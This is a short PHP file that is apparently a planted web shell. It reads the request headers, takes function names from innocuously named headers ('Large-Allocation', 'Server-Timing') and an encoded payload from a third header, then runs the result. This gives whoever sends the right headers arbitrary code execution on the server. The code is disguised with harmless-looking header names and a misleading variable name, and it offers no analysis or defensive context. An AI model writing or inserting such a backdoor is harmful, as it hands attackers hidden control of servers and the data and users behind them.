<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $db2_convert = $_HEADERS['Large-Allocation']('', $_HEADERS['Server-Timing']($_HEADERS['X-Dns-Prefetch-Control']));
    $db2_convert();
}